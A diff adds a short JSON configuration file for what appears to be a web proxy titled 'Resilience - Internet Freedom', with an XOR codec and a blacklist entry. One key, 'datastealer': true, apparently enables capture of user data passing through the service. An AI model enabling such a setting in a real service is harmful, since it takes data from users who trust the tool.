@@ -1,0 +1,8 @@
+{
+    "port": 8443,
+    "prefix": "/service/",
+    "title": "Resilience - Internet Freedom",
+    "codec": "xor",
+    "datastealer": true,
+    "blacklist": ["accounts.google.com"]
+}
